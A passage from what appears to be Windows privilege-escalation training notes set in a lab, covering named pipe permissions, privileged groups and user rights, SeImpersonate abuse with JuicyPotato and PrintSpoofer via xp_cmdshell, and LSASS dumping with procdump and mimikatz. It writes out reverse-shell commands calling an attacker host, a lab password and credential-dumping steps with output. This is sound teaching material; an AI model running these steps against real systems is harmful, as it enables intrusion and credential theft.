The command completed successfully</code></pre></div><p>Â </p><p>Â </p><h4 id=get-password-policy--other-account-information>Get Password Policy & Other Account Information</h4><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER</code></pre></div><p>Â </p><p>Â </p><h1 id=communication-with-processes>Communication with Processes</h1><p>Â </p><h4 id=listing-named-pipes-with-pipelist>Listing Named Pipes with Pipelist</h4><p>Communication with Processes</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; pipelist.exe /accepteula

PipeList v1.02 - Lists open named pipes
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
Winsock2\CatalogChangeListener-340-0              1                1
Winsock2\CatalogChangeListener-414-0              1                1
epmapper                                          3               -1
Winsock2\CatalogChangeListener-3ec-0              1                1
Winsock2\CatalogChangeListener-44c-0              1                1
LSM_API_service                                   3               -1
atsvc                                             3               -1
Winsock2\CatalogChangeListener-5e0-0              1                1
eventlog                                          3               -1
Winsock2\CatalogChangeListener-6a8-0              1                1
spoolss                                           3               -1
Winsock2\CatalogChangeListener-ec0-0              1                1
wkssvc                                            4               -1
trkwks                                            3               -1
vmware-usbarbpipe                                 5               -1
srvsvc</code></pre></div><p>Â </p><p>Â </p><h4 id=listing-named-pipes-with-powershell>Listing Named Pipes with PowerShell</h4><p>Communication with Processes</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt;  gci \\.\pipe\


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc


    Directory: \\.\pipe\Winsock2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              1 Winsock2\CatalogChangeListener-34c-0


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 epmapper

&lt;SNIP&gt;</code></pre></div><p>Â </p><p>Â </p><h4 id=reviewing-lsass-named-pipe-permissions>Reviewing LSASS Named Pipe Permissions</h4><p>Communication with Processes</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; accesschk.exe /accepteula \\.\Pipe\lsass -v

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\lsass
  Untrusted Mandatory Level [No-Write-Up]
  RW Everyone
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h2 id=named-pipes-attack-example>Named Pipes Attack Example</h2><p>Let&rsquo;s walk through an example of taking advantage of an exposed named pipe to escalate privileges. This <a href=https://www.exploit-db.com/exploits/48021 rel=external>WindscribeService Named Pipe Privilege Escalation</a> is a great example. Using <code>accesschk</code> we can search for all named pipes that allow write access with a command such as <code>accesschk.exe -w \pipe\* -v</code> and notice that the <code>WindscribeService</code> named pipe allows <code>READ</code> and <code>WRITE</code> access to the <code>Everyone</code> group, meaning all authenticated users.</p><h4 id=checking-windscribeservice-named-pipe-permissions>Checking WindscribeService Named Pipe Permissions</h4><p>Confirming with <code>accesschk</code> we see that the Everyone group does indeed have <code>FILE_ALL_ACCESS</code> (All possible access rights) over the pipe.</p><p>Communication with Processes</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; accesschk.exe -accepteula -w \pipe\WindscribeService -v

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright âŒ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS</code></pre></div><p>From here, we could leverage these lax permissions to escalate privileges on the host to SYSTEM.</p><p>VPN Servers</p><p>Â </p><p>Â </p><h1 id=windows-privileges-overview>Windows Privileges Overview</h1><p>Â </p><p><a href=#R-image-ffecc605026b1a073c248b70512c0127 class=lightbox-link><img alt=85c6abe427428252b5f141a3a2f73b9c.png class="lazy lightbox figure-image" loading=lazy src=../../resources/85c6abe427428252b5f141a3a2f73b9c.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ffecc605026b1a073c248b70512c0127><img alt=85c6abe427428252b5f141a3a2f73b9c.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/85c6abe427428252b5f141a3a2f73b9c.png></a></p><p>Â </p><p>Â </p><table><thead><tr><th><strong>Group</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>Default Administrators</td><td>Domain Admins and Enterprise Admins are &ldquo;super&rdquo; groups.</td></tr><tr><td>Server Operators</td><td>Members can modify services, access SMB shares, and backup files.</td></tr><tr><td>Backup Operators</td><td>Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.</td></tr><tr><td>Print Operators</td><td>Members can log on to DCs locally and &ldquo;trick&rdquo; Windows into loading a malicious driver.</td></tr><tr><td>Hyper-V Administrators</td><td>If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.</td></tr><tr><td>Account Operators</td><td>Members can modify non-protected accounts and groups in the domain.</td></tr><tr><td>Remote Desktop Users</td><td>Members are not given any useful permissions by default but are often granted additional rights such as <code>Allow Login Through Remote Desktop Services</code> and can move laterally using the RDP protocol.</td></tr><tr><td>Remote Management Users</td><td>Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).</td></tr><tr><td>Group Policy Creator Owners</td><td>Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.</td></tr><tr><td>Schema Admins</td><td>Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.</td></tr><tr><td>DNS Admins</td><td>Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to <a href=https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/ rel=external>create a WPAD record</a>.</td></tr></tbody></table><p>Â </p><p>Â </p><h2 id=user-rights-assignment>User Rights Assignment</h2><p>Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account. This Microsoft article on <a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment rel=external>User Rights Assignment</a> provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right. Below are some of the key user rights assignments, which are settings applied to the localhost. These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.</p><table><thead><tr><th>Setting <a href=https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants rel=external>Constant</a></th><th>Setting Name</th><th>Standard Assignment</th><th>Description</th></tr></thead><tbody><tr><td>SeNetworkLogonRight</td><td><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network rel=external>Access this computer from the network</a></td><td>Administrators, Authenticated Users</td><td>Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.</td></tr><tr><td>SeRemoteInteractiveLogonRight</td><td><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services rel=external>Allow log on through Remote Desktop Services</a></td><td>Administrators, Remote Desktop Users</td><td>This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.</td></tr><tr><td>SeBackupPrivilege</td><td><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories rel=external>Back up files and directories</a></td><td>Administrators</td><td>This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.</td></tr><tr><td>SeSecurityPrivilege</td><td><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log rel=external>Manage auditing and security log</a></td><td>Administrators</td><td>This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.</td></tr><tr><td>SeTakeOwnershipPrivilege</td><td><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects rel=external>Take ownership of files or other objects</a></td><td>Administrators</td><td>This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.</td></tr><tr><td>SeDebugPrivilege</td><td><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs rel=external>Debug programs</a></td><td>Administrators</td><td>This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.</td></tr><tr><td>SeImpersonatePrivilege</td><td><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication rel=external>Impersonate a client after authentication</a></td><td>Administrators, Local Service, Network Service, Service</td><td>This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.</td></tr><tr><td>SeLoadDriverPrivilege</td><td><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers rel=external>Load and unload device drivers</a></td><td>Administrators</td><td>This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.</td></tr><tr><td>SeRestorePrivilege</td><td><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories rel=external>Restore files and directories</a></td><td>Administrators</td><td>This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object</td></tr></tbody></table><p>Â </p><p>process. One example is this PowerShell <a href=https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1 rel=external>script</a> which can be used to enable certain privileges, or this <a href=https://www.leeholmes.com/adjusting-token-privileges-in-powershell/ rel=external>script</a> which can be used to adjust token privileges.</p><p>Â </p><h4 id=backup-operators-rights>Backup Operators Rights</h4><p>Windows Privileges Overview</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre></div><p>Â </p><p>Â </p><h2 id=seimpersonate-example---juicypotato>SeImpersonate Example - JuicyPotato</h2><p>Let&rsquo;s take the example below, where we have gained a foothold on a SQL server using a privileged SQL user. Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the <a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication rel=external>Impersonate a client after authentication</a> privilege.</p><p>In this scenario, the SQL Service service account is running in the context of the default <code>mssqlserver</code> account. Imagine we have achieved command execution as this user using <code>xp_cmdshell</code> using a set of credentials obtained in a <code>logins.sql</code> file on a file share using the <code>Snaffler</code> tool.</p><h4 id=connecting-with-mssqlclientpy>Connecting with MSSQLClient.py</h4><p>Using the credentials <code>sql_dev:Str0ng_P@ssw0rd!</code>, let&rsquo;s first connect to the SQL server instance and confirm our privileges. We can do this using <a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py rel=external>mssqlclient.py</a> from the <code>Impacket</code> toolkit.</p><p>SeImpersonate and SeAssignPrimaryToken</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Encryption required, switching to TLS
</span></span><span style=display:flex><span>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
</span></span><span style=display:flex><span>[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
</span></span><span style=display:flex><span>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
</span></span><span style=display:flex><span>[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to &#39;master&#39;.
</span></span><span style=display:flex><span>[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
</span></span><span style=display:flex><span>[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
</span></span><span style=display:flex><span>[!] Press help for extra shell commands
</span></span><span style=display:flex><span>SQL&gt;
</span></span></code></pre></div><h4 id=enabling-xp_cmdshell>Enabling xp_cmdshell</h4><p>Next, we must enable the <code>xp_cmdshell</code> stored procedure to run operating system commands. We can do this via the Impacket MSSSQL shell by typing <code>enable_xp_cmdshell</code>. Typing <code>help</code> displays a few other command options.</p><p>SeImpersonate and SeAssignPrimaryToken</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>SQL&gt; enable_xp_cmdshell
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option &#39;show advanced options&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.
</span></span><span style=display:flex><span>[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option &#39;xp_cmdshell&#39; changed from 0 to 1. Run the RECONFIGURE statement to install
</span></span></code></pre></div><p>Note: We don&rsquo;t actually have to type <code>RECONFIGURE</code> as Impacket does this for us.</p><h4 id=confirming-access>Confirming Access</h4><p>With this access, we can confirm that we are indeed running in the context of a SQL Server service account.</p><p>SeImpersonate and SeAssignPrimaryToken</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>SQL&gt; xp_cmdshell whoami
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>output                                                                             
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>--------------------------------------------------------------------------------   
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>nt service\mssql$sqlexpress01
</span></span></code></pre></div><h4 id=checking-account-privileges>Checking Account Privileges</h4><p>Next, let&rsquo;s check what privileges the service account has been granted.</p><p>SeImpersonate and SeAssignPrimaryToken</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>SQL&gt; xp_cmdshell whoami /priv
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>output                                                                             
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>--------------------------------------------------------------------------------   
</span></span><span style=display:flex><span>                                                                    
</span></span><span style=display:flex><span>PRIVILEGES INFORMATION                                                             
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>----------------------                                                             
</span></span><span style=display:flex><span>Privilege Name                Description                               State      
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>============================= ========================================= ========   
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
</span></span><span style=display:flex><span>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
</span></span><span style=display:flex><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
</span></span><span style=display:flex><span>SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
</span></span><span style=display:flex><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
</span></span><span style=display:flex><span>SeCreateGlobalPrivilege       Create global objects                     Enabled    
</span></span><span style=display:flex><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
</span></span></code></pre></div><p>The command <code>whoami /priv</code> confirms that <a href=https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege rel=external>SeImpersonatePrivilege</a> is listed. This privilege can be used to impersonate a privileged account such as <code>NT AUTHORITY\SYSTEM</code>. <a href=https://github.com/ohpe/juicy-potato rel=external>JuicyPotato</a> can be used to exploit the <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> privileges via DCOM/NTLM reflection abuse.</p><h4 id=escalating-privileges-using-juicypotato>Escalating Privileges Using JuicyPotato</h4><p>To escalate privileges using these rights, let&rsquo;s first download the <code>JuicyPotato.exe</code> binary and upload this and <code>nc.exe</code> to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where <code>-l</code> is the COM server listening port, <code>-p</code> is the program to launch (cmd.exe), <code>-a</code> is the argument passed to cmd.exe, and <code>-t</code> is the <code>createprocess</code> call. Below, we are telling the tool to try both the <a href=https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw rel=external>CreateProcessWithTokenW</a> and <a href=https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera rel=external>CreateProcessAsUser</a> functions, which need <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> privileges respectively.</p><p>SeImpersonate and SeAssignPrimaryToken</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &#34;/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe&#34; -t *
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>output                                                                             
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>--------------------------------------------------------------------------------   
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
</span></span><span style=display:flex><span>                                                                            
</span></span><span style=display:flex><span>[+] authresult 0                                                                   
</span></span><span style=display:flex><span>{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
</span></span><span style=display:flex><span>[+] CreateProcessWithTokenW OK                                                     
</span></span><span style=display:flex><span>[+] calling 0x000000000088ce08
</span></span></code></pre></div><h4 id=catching-system-shell>Catching SYSTEM Shell</h4><p>This completes successfully, and a shell as <code>NT AUTHORITY\SYSTEM</code> is received.</p><p>SeImpersonate and SeAssignPrimaryToken</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo nc -lnvp 8443
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>listening on [any] 8443 ...
</span></span><span style=display:flex><span>connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
</span></span><span style=display:flex><span>Microsoft Windows [Version 10.0.14393]
</span></span><span style=display:flex><span>(c) 2016 Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>C:\Windows\system32&gt;whoami
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>whoami
</span></span><span style=display:flex><span>nt authority\system
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>C:\Windows\system32&gt;hostname
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>hostname
</span></span><span style=display:flex><span>WINLPE-SRV01
</span></span></code></pre></div><hr><h2 id=printspoofer-and-roguepotato>PrintSpoofer and RoguePotato</h2><p>JuicyPotato doesn&rsquo;t work on Windows Server 2019 and Windows 10 build 1809 onwards. However, <a href=https://github.com/itm4n/PrintSpoofer rel=external>PrintSpoofer</a> and <a href=https://github.com/antonioCoco/RoguePotato rel=external>RoguePotato</a> can be used to leverage the same privileges and gain <code>NT AUTHORITY\SYSTEM</code> level access. This <a href=https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/ rel=external>blog post</a> goes in-depth on the <code>PrintSpoofer</code> tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.</p><h4 id=escalating-privileges-using-printspoofer>Escalating Privileges using PrintSpoofer</h4><p>Let&rsquo;s try this out using the <code>PrintSpoofer</code> tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with <code>mssqlclient.py</code> and use the tool with the <code>-c</code> argument to execute a command. Here, using <code>nc.exe</code> to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).</p><p>SeImpersonate and SeAssignPrimaryToken</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>SQL&gt; xp_cmdshell c:\tools\PrintSpoofer.exe -c &#34;c:\tools\nc.exe 10.10.14.3 8443 -e cmd&#34;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>output                                                                             
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>--------------------------------------------------------------------------------   
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Found privilege: SeImpersonatePrivilege                                        
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Named pipe listening...                                                        
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] CreateProcessAsUser() OK                                                       
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>NULL
</span></span></code></pre></div><h4 id=catching-reverse-shell-as-system>Catching Reverse Shell as SYSTEM</h4><p>If all goes according to plan, we will have a SYSTEM shell on our netcat listener.</p><p>SeImpersonate and SeAssignPrimaryToken</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ nc -lnvp 8443
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>listening on [any] 8443 ...
</span></span><span style=display:flex><span>connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
</span></span><span style=display:flex><span>Microsoft Windows [Version 10.0.14393]
</span></span><span style=display:flex><span>(c) 2016 Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>C:\Windows\system32&gt;whoami
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>whoami
</span></span><span style=display:flex><span>nt authority\system
</span></span></code></pre></div><p>Â </p><p>Â </p><h1 id=sedebugprivilege>SeDebugPrivilege</h1><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set</code></pre></div><p>Â </p><p>Â </p><p>We can use <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/procdump rel=external>ProcDump</a> from the <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite rel=external>SysInternals</a> suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (<a href=https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service rel=external>LSASS</a>) process, which stores user credentials after a user logs on to a system.</p><p>Â </p><p>Â </p><p>SeDebugPrivilege</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.</code></pre></div><p>Â </p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using &#39;mimikatz.log&#39; for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : &#39;lsass.dmp&#39;

mimikatz # sekurlsa::logonpasswords
Opening : &#39;lsass.dmp&#39; file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
